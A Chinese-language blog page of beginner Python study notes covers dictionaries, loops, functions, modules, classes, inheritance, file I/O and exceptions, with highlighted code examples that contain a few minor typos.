-<h1 id="字典"><a href="#字典" class="headerlink" title="字典"></a>字典</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">alien_0 = &#123;<span class="string">&#x27;color&#x27;</span>:<span class="string">&#x27;green&#x27;</span>,<span class="string">&#x27;points&#x27;</span>:<span class="number">5</span>&#125;</span><br><span class="line"><span class="built_in">print</span>(alien_0[<span class="string">&#x27;color&#x27;</span>])</span><br><span class="line">alien_0[<span class="string">&#x27;x_position&#x27;</span>] = <span class="number">0</span></span><br><span class="line">alien_0[<span class="string">&#x27;y_position&#x27;</span>] = <span class="number">25</span></span><br><span class="line"><span class="built_in">print</span>(alien_0)</span><br><span class="line"><span class="keyword">del</span> alien_0[<span class="string">&#x27;points&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(alien_0)</span><br></pre></td></tr></table></figure>
-<p>遍历字典：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">user_0 = &#123;</span><br><span class="line">    <span class="string">&#x27;username&#x27;</span>: <span class="string">&#x27;efermi&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;first&#x27;</span>: <span class="string">&#x27;enrico&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;last&#x27;</span>: <span class="string">&#x27;fermi&#x27;</span>,</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">for</span> key,value <span class="keyword">in</span> user_0.items():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\nKey: &quot;</span>+key)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Value: &quot;</span>+value)</span><br></pre></td></tr></table></figure>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">favorite_languages = &#123;</span><br><span class="line">    <span class="string">&#x27;jen&#x27;</span>: <span class="string">&#x27;python&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;sarah&#x27;</span>: <span class="string">&#x27;c&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;edward&#x27;</span>: <span class="string">&#x27;ruby&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;phil&#x27;</span>: <span class="string">&#x27;python&#x27;</span>,</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> name <span class="keyword">in</span> favorite_languages.keys():</span><br><span class="line">    <span class="built_in">print</span>(name.title())</span><br></pre></td></tr></table></figure>
-<p>遍历字典时，会默认遍历所有的键。如果将<code>for name in favorite_language.keys():</code>替换为<code>for name in favorite_languages:</code>输出不变。<br><strong>实际上，方法keys()返回一个列表，其中包含字典中的所有键。</strong><br>方法values()返回一个值列表，为剔除重复项，可使用集合(set)集合类似于列表，但每个元素都必须是独一无二的。</p>
-<h1 id="用户输入和while循环"><a href="#用户输入和while循环" class="headerlink" title="用户输入和while循环"></a>用户输入和while循环</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">message = <span class="built_in">input</span>(<span class="string">&quot;Tell me something,and I will repeat it back to you: &quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(message)</span><br></pre></td></tr></table></figure>
-<p>通过int()来获取数值输入</p>
-<p>删除包含特定值的所有列表元素</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pets = [<span class="string">&#x27;dog&#x27;</span>,<span class="string">&#x27;cat&#x27;</span>,<span class="string">&#x27;dog&#x27;</span>,<span class="string">&#x27;goldfish&#x27;</span>,<span class="string">&#x27;cat&#x27;</span>,<span class="string">&#x27;rabit&#x27;</span>,<span class="string">&#x27;cat&#x27;</span>]</span><br><span class="line"><span class="keyword">while</span> <span class="string">&#x27;cat&#x27;</span> <span class="keyword">in</span> pets:</span><br><span class="line">    pets.remove(<span class="string">&#x27;cat&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(pets)</span><br></pre></td></tr></table></figure>
-<p>使用用户输入填充字典</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">response = &#123;&#125;</span><br><span class="line"><span class="comment"># 设置一个标志</span></span><br><span class="line">polling_active = <span class="literal">True</span></span><br><span class="line"><span class="keyword">while</span> polling_active:</span><br><span class="line">    name = <span class="built_in">input</span>(<span class="string">&quot;\nWhat is you name? &quot;</span>)</span><br><span class="line">    response = <span class="built_in">input</span>(<span class="string">&quot;Which mountain would you like to climb someday? &quot;</span>)</span><br><span class="line">    <span class="comment"># 将答案存储在字典中</span></span><br><span class="line">    responses[name] = response</span><br><span class="line">    <span class="comment"># 看看是否还有人要参与调查</span></span><br><span class="line">    repeat = <span class="built_in">input</span>(<span class="string">&quot;Would you like to led another person respond? (yes/ no) &quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> repeat == <span class="string">&#x27;no&#x27;</span>:</span><br><span class="line">        polling_active = <span class="literal">False</span></span><br><span class="line"><span class="comment"># 调查结束，显示结果</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;\n---Poll Results ---&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> name,response <span class="keyword">in</span> responses.items():</span><br><span class="line">    <span class="built_in">print</span>(name+<span class="string">&quot; would like to climb &quot;</span>+response+<span class="string">&quot;.&quot;</span>)</span><br></pre></td></tr></table></figure>
-
-<h1 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h1><p>定义函数</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">greet_user</span>(<span class="params">username</span>)):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;显示简单的问候语&quot;&quot;&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Hello, &quot;</span>+username.title()+<span class="string">&quot;!&quot;</span>)</span><br><span class="line">greet_user(<span class="string">&#x27;jesse&#x27;</span>)</span><br></pre></td></tr></table></figure>
-<p>“”””””中的文本被称为<strong>文档字符串</strong>的注释，python用它们来生成有关程序中函数的文档。</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">describe_pet</span>(<span class="params">animal_type,pet_name</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;&quot;显示宠物的信息&quot;&quot;&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\nI have a &quot;</span>+animal_type+<span class="string">&quot;.&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;My &quot;</span>+animal_type+<span class="string">&quot;&#x27;s name is &quot;</span>+pet_name.title()+<span class="string">&quot;.&quot;</span>)</span><br><span class="line">describe_pet(<span class="string">&#x27;hamster&#x27;</span>,<span class="string">&#x27;harry&#x27;</span>)<span class="comment"># 位置实参</span></span><br><span class="line">describe_pet(animal_type=<span class="string">&#x27;hamster&#x27;</span>,pet_name=<span class="string">&#x27;harry&#x27;</span>)<span class="comment"># 关键字实参</span></span><br></pre></td></tr></table></figure>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">describe_pet</span>(<span class="params">pet_name,animal_type=<span class="string">&#x27;dog&#x27;</span></span>):<span class="comment"># 默认值</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;&quot;显示宠物的信息&quot;&quot;&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\nI have a &quot;</span>+animal_type+<span class="string">&quot;.&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;My &quot;</span>+animal_type+<span class="string">&quot;&#x27;s name is &quot;</span>+pet_name.title()+<span class="string">&quot;.&quot;</span>)</span><br><span class="line">    describe_pet(pet_name=<span class="string">&#x27;willie&#x27;</span>)</span><br></pre></td></tr></table></figure>
-<p><strong>在使用默认值的时候，在形参列表中必须先列出没有默认值的参数，在列出有默认值的形参。</strong></p>
-<p>传递任意数量的实参：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">make_pizza</span>(<span class="params">*toppings</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;&quot;打印顾客点的所有配料&quot;&quot;&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(toppings)</span><br><span class="line">make_pizza(<span class="string">&#x27;pepperoni&#x27;</span>)</span><br><span class="line">make_pizza(<span class="string">&#x27;mashrooms&#x27;</span>,<span class="string">&#x27;green peppers&#x27;</span>,<span class="string">&#x27;extra cheese&#x27;</span>)</span><br></pre></td></tr></table></figure>
-<p>形参名*toppings中的星号让python创建一个名为toppings的空元组，并将收到的所有值都封装到这个元组中。<br>如果要让函数接受不同类型的实参，必须在函数定义中将接纳任意数量实参的形参放在最后。</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">build_profile</span>(<span class="params">first,last,**user_info</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;&quot;创建一个字典，其中包含我们知道的有关用户的一切&quot;&quot;&quot;</span></span><br><span class="line">    profile = &#123;&#125;</span><br><span class="line">    profile[<span class="string">&#x27;first_name&#x27;</span>] = first</span><br><span class="line">    profile[<span class="string">&#x27;last_name&#x27;</span>] = last</span><br><span class="line">    <span class="keyword">for</span> key,value <span class="keyword">in</span> user_info.items():</span><br><span class="line">        profile[key] = value</span><br><span class="line">    <span class="keyword">return</span> profile</span><br><span class="line">user_profile = build_profile(<span class="string">&#x27;albert&#x27;</span>,<span class="string">&#x27;einstein&#x27;</span>,</span><br><span class="line">                              location = <span class="string">&#x27;princeton&#x27;</span>,</span><br><span class="line">                              field = <span class="string">&#x27;physics&#x27;</span>  </span><br><span class="line">                                )</span><br><span class="line"><span class="built_in">print</span>(user_profile)</span><br></pre></td></tr></table></figure>
-<p>形参**user_info中的两个星号让python<br>创建一个名为user_info的空字典，并将收到的所有名称——值对都封装到这个字典中</p>
-<h2 id="将函数存储在模块中"><a href="#将函数存储在模块中" class="headerlink" title="将函数存储在模块中"></a>将函数存储在模块中</h2><ul>
-<li>导入整个模块<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pizza</span><br><span class="line">pizza.make_pizza(<span class="number">16</span>,<span class="string">&#x27;pepperoni&#x27;</span>)</span><br></pre></td></tr></table></figure>
-要调用被导入的模块中的函数，可指定导入的模块的名称pizza和函数名make_pizza(),并用句点分隔它们<br><code>module_name.function_name()</code></li>
-<li>导入特定的函数<br><code>from module_name import function_name</code><br>通过用逗号分隔函数名，可根据需要从模块中导入任意数量的函数<br><code>from module_name import function_0,function_1,function_2</code><br>若使用这种语法，调用函数时就无需使用句点。</li>
-<li>使用as给函数指定别名<br><code>from module_name import function_name as fn</code></li>
-<li>使用as给模块指定别名<br><code>import module_name as mn</code></li>
-<li>导入模块中的所有函数<br><code>from module_name import *</code><br>可直接通过名称调用</li>
-</ul>
-<h1 id="类"><a href="#类" class="headerlink" title="类"></a>类</h1><h2 id="创建类"><a href="#创建类" class="headerlink" title="创建类"></a>创建类</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Dog</span>():</span><br><span class="line">    <span class="string">&quot;&quot;&quot;一次模拟小狗的简单尝试&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self,name,age</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;初始化属性name和age&quot;&quot;&quot;</span></span><br><span class="line">        self.name = name</span><br><span class="line">        self.age = age</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">sit</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;模拟小狗被命令时蹲下&quot;&quot;&quot;</span></span><br><span class="line">        <span class="built_in">print</span>(self.name.title()+<span class="string">&quot; is now sitting.&quot;</span>)</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">roll_over</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;模拟小狗被命令时打滚&quot;&quot;&quot;</span></span><br><span class="line">        <span class="built_in">print</span>(self.name.title()+<span class="string">&quot; rolled over!&quot;</span>)</span><br></pre></td></tr></table></figure>
-<p>根据约定，在python中，首字母大写的名称指的是类。</p>
-<ul>
-<li>方法__init__()<blockquote>
-<p>类中的函数称为方法。<strong>init</strong>()是一个特殊的方法，每当你根据Dog类创建新实例时，Python都会自动运行它。在这个方法的名称中，开头和末尾各有两个下下划线，这是一种约定，旨在避免Python默认方法与普通方法发生名称冲突。</p>
-</blockquote>
-</li>
-</ul>
-<blockquote>
-<p>我们将方法__init__()定义成了包含三个形参：self、name和age。在这个方法的定义中，形参self必不可少，还必须位于其他形参的前面。因为Python调用这个__init__()方法来创建Dog实例时，将自动传入实参self。每个与类相关联的方法调用都自动传递实参self，它是一个指向实例本身的引用，让示例能够访问类中的属性和方法。</p>
-</blockquote>
-<blockquote>
-<p>以self为前缀的变量都可供类中的所有方法使用，self.name = name获取存储在形参name中的值，并将其存储到变量name中，然后该变量被关联到当前创建的实例。self.age = age的作用与此类似。像这样可通过实例访问的变量称为属性</p>
-</blockquote>
-<blockquote>
-<p>Dog类还定义了另外两个方法：sit()和roll_over()由于这些方法不需要额外的信息，如名字或年龄，因此它们只有一个形参self</p>
-</blockquote>
-<h2 id="根据类创建实例"><a href="#根据类创建实例" class="headerlink" title="根据类创建实例"></a>根据类创建实例</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Dog</span>():</span><br><span class="line">    --snip--</span><br><span class="line">my_dog = Dog(<span class="string">&#x27;whllie&#x27;</span>,<span class="number">6</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;My dog&#x27;s name is &quot;</span>+my_dog.name.title()+<span class="string">&#x27;.&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;My dog is &quot;</span><span class="built_in">str</span>(my_dog.age)+<span class="string">&quot; years old.&quot;</span>)</span><br></pre></td></tr></table></figure>
-<ul>
-<li> 访问属性<br><code>my_dog.name</code></li>
-<li>调用方法<br><code>my_dog.sit()</code><br><code>my_dog.roll_over()</code></li>
-<li>给属性指定默认值  <blockquote>
-<p>类中的每个属性都必须有初始值，哪怕这个值是0或空字符串。如设置默认值时，在方法__init__()内中鼎这种初始值是可行的；如果你对某个属性这样做了，就无需包含为它提供初始值的形参。</p>
-</blockquote>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Car</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self,make,model,year</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;初始化描述汽车的属性&quot;&quot;&quot;</span></span><br><span class="line">         self.make = make</span><br><span class="line">         self.model = model</span><br><span class="line">         self.year = year</span><br><span class="line">         self.odometer_reading = <span class="number">0</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_descriptive_name</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;返回整洁的描述性信息&quot;&quot;&quot;</span></span><br><span class="line">        long_name = <span class="built_in">str</span>(self.year)+<span class="string">&#x27; &#x27;</span>+self.make+<span class="string">&#x27; &#x27;</span>+self.model</span><br><span class="line">        <span class="keyword">return</span> long_name.title()</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_odometer</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;打印一条指出汽车里程的消息&quot;&quot;&quot;</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;This car has &quot;</span>+<span class="built_in">str</span>(self.odometer_reading)+<span class="string">&quot;miles on it.&quot;</span>)</span><br><span class="line">my_new_car = Car(<span class="string">&#x27;audi&#x27;</span>,<span class="string">&#x27;a4&#x27;</span>,<span class="number">2016</span>)</span><br><span class="line"><span class="built_in">print</span>(my_new_car.get_descriptive_name())</span><br><span class="line">my_new_car.read_odometer()</span><br></pre></td></tr></table></figure></li>
-<li>修改属性的值  <ul>
-<li>直接修改属性的值<br><code>my_new_car.odometer_reading = 23</code></li>
-<li>通过方法修改属性的值<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Car</span>():</span><br><span class="line">    --snip--</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">update_odometer</span>(<span class="params">self,mileage</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;将里程表读数设置为指定的值&quot;&quot;&quot;</span></span><br><span class="line">        self.odometer_reading = mileage</span><br><span class="line">my_new_car.update_odometer(<span class="number">23</span>)</span><br></pre></td></tr></table></figure>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">update_odometer</span>(<span class="params">self,mileage</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    将里程表读数设置为指定的值</span></span><br><span class="line"><span class="string">    禁止将里程表读数往回调</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">if</span> mileage &gt;= self.odometer_reading:</span><br><span class="line">        self.odometer_reading = mileage</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;You can&#x27;t roll back an odometer!&quot;</span>)</span><br></pre></td></tr></table></figure></li>
-<li>通过方法对属性的值进行递增<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">increment_odometer</span>(<span class="params">self,miles</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;将里程表读数增加指定的量&quot;&quot;&quot;</span></span><br><span class="line">    self.odometer_reading += miles</span><br></pre></td></tr></table></figure></li>
-</ul>
-</li>
-</ul>
-<h2 id="继承"><a href="#继承" class="headerlink" title="继承"></a>继承</h2><blockquote>
-<p>一个类继承另一个类时，它将自动获得另一个类的所有属性和方法；原有的类称为父类，而新类称为子类，子类继承了其父类的所有属性和方法，同时还可以定义自己的属性和方法。</p>
-</blockquote>
-<ul>
-<li><p>子类的方法__init__()</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Car</span>():</span><br><span class="line">    --snip--</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ElectricCar</span>(<span class="title class_ inherited__">Car</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;电动汽车的独特之处&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self,make,model,year</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;初始化父类的属性&quot;&quot;&quot;</span></span><br><span class="line">        <span class="built_in">super</span>().__init__(make,model,year)</span><br><span class="line">my_tesla = ElectricCar(<span class="string">&#x27;tesla&#x27;</span>,<span class="string">&#x27;model s&#x27;</span>,<span class="number">2016</span>)</span><br><span class="line"><span class="built_in">print</span>(my_tesla.get_descriptive_name())</span><br></pre></td></tr></table></figure></li>
-<li><p>给子类定义属性和方法</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self,make,model,year</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    电动汽车的独特之处</span></span><br><span class="line"><span class="string">    初始化父类的属性，再初始化电动汽车特有的属性</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="built_in">super</span>().__init__(make,model,year)</span><br><span class="line">    self.battery_size = <span class="number">70</span></span><br></pre></td></tr></table></figure></li>
-<li><p>重写父类的方法</p>
-<blockquote>
-<p>可在子类中定义一个与要重写的父类方法同名的方法。这样python将不会考虑这个父类方法，而只关注你在子类中定义的相应方法</p>
-</blockquote>
-</li>
-</ul>
-<h1 id="文件和异常"><a href="#文件和异常" class="headerlink" title="文件和异常"></a>文件和异常</h1><h2 id="读取整个文件"><a href="#读取整个文件" class="headerlink" title="读取整个文件"></a>读取整个文件</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;pi_digits.txt&#x27;</span>) <span class="keyword">as</span> file_object:</span><br><span class="line">    contents = file_object.read()</span><br><span class="line">    <span class="built_in">print</span>(contents)</span><br></pre></td></tr></table></figure>
-<ul>
-<li>open()接受一个参数：要打开的文件的名称。python在当前执行的文件所在的目录中查找指定的文件。函数open()返回一个表示文件的对象。</li>
-<li>关键字with在不再需要访问文件后将其关闭。也可以调用open()和close()来打开和关闭文件，但这样做时，如果程序存在bug，导致close()语句未执行，文件将不会关闭。</li>
-<li>方法read() 读取这个文件的全部内容，并将其作为一个长长的字符串存储在变量contents中。<br>read()到达文件末尾时返回一个空字符串，而将这个空字符串显示出来时就是一个空行。要删除末尾的空行，可使用rstrip()</li>
-</ul>
-<h2 id="文件路径"><a href="#文件路径" class="headerlink" title="文件路径"></a>文件路径</h2><ul>
-<li>相对路径<br><code>with open(&#39;text_files\filename.txt&#39;) as file_object:</code>  </li>
-<li><em>在windows系统中，文件路径中使用反斜杠“\”</em>*  </li>
-<li><em>而在Linux中使用斜杠‘/’</em>*</li>
-<li>绝对路径<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">file_path = <span class="string">r&#x27;C:\Users\sfc9982\other_files\text_files\filename.txt&#x27;</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(file_path) <span class="keyword">as</span> file_object:</span><br></pre></td></tr></table></figure></li>
-</ul>
-<h2 id="逐行读取"><a href="#逐行读取" class="headerlink" title="逐行读取"></a>逐行读取</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">filename = <span class="string">&#x27;pi_digits.txt&#x27;</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(filename) <span class="keyword">as</span> file_object:</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> file_object:</span><br><span class="line">        <span class="built_in">print</span>(line)</span><br></pre></td></tr></table></figure>
-<ul>
-<li>创建一个包含文件各行内容的列表<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">filename = <span class="string">&#x27;pi_digits.txt&#x27;</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(filename) <span class="keyword">as</span> file_object:</span><br><span class="line">    lines = file_object.readlines()</span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> lines:</span><br><span class="line">    <span class="built_in">print</span>(line.rstrip())</span><br></pre></td></tr></table></figure>
-<blockquote>
-<p>方法readline()从文件中读取每一行，并将其存储在一个列表中；该列表被存储到变量lines中；在with代码块外，依然可以使用这个变量。</p>
-</blockquote>
-</li>
-</ul>
-<h2 id="写入文件"><a href="#写入文件" class="headerlink" title="写入文件"></a>写入文件</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">filename = <span class="string">&#x27;programming.txt&#x27;</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(filename,<span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> file_object:</span><br><span class="line">    file_object.write(<span class="string">&quot;I love NSILAB.&quot;</span>)</span><br></pre></td></tr></table></figure>
-<blockquote>
-<p>在这个实例中，调用open()时提供了两个实参，第二个实参‘w’告诉python，我们要以<em>写入模式</em>打开这个文件。<br>打开文件时，可指定<em>读取模式</em>（‘r’）、<em>写入模式</em>（‘w’）、<em>附加模式</em>（‘a’）或让你能够读取和写入文件的模式（‘r+’）。如果你省略了模式实参，python将以默认的只读模式打开文件<br>如果你要写入的文件不存在，函数open()将自动创建它。然而，以写入（‘w’）模式打开文件时千万要小心，因为如果指定的文件已经存在，python将在返回文件对象前清空该文件。<br>如果你要给文件添加内容，而不是覆盖原有的内容，可以<em>附加模式</em>打开文件。你以附加模式打开文件时，python不会再返回文件对象前清空文件，而你写入到文件的行都将添加到文件末尾。如果指定的文件不存在，python将为你创建一个空文件。   </p>
-</blockquote>
-<h2 id="异常"><a href="#异常" class="headerlink" title="异常"></a>异常</h2><blockquote>
-<p>每当发生让python不知所措的错误时，它都会创建一个异常对象。如果你编写了处理该异常的代码，程序将继续运行；如果你未对异常进行处理，程序将停止，并显示一个traceback，其中包含有关异常的报告。  </p>
-</blockquote>
-<blockquote>
-<p>异常是使用try-except代码块处理的。try-except代码块让python执行指定的操作，同时告诉python发生异常时怎么办。</p>
-</blockquote>
-<ul>
-<li> 处理ZeroDivisionError异常<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="number">5</span>/<span class="number">0</span>)</span><br></pre></td></tr></table></figure></li>
-</ul>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="number">5</span>/<span class="number">0</span>)</span><br><span class="line"><span class="keyword">except</span> ZeroDivisionError:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;You can&#x27;t divide by zero!&quot;</span>)</span><br></pre></td></tr></table></figure>
